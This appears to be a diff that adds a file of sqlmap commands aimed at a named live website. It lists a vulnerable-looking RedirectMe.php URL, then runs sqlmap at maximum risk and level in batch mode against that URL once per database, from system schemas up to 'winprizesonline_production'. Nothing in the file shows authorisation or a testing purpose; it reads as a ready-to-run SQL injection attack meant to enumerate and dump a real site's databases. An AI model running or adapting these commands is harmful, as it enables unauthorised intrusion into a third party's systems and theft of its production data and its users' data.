@@ -1,0 +1,8 @@
+https://www.winprizesonline.com/RedirectMe.php?webid=218035
+python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D information_schema
+python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D innodb
+python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D mysql
+python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D performance_schema
+python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D sys
+python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D tmp
+python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production
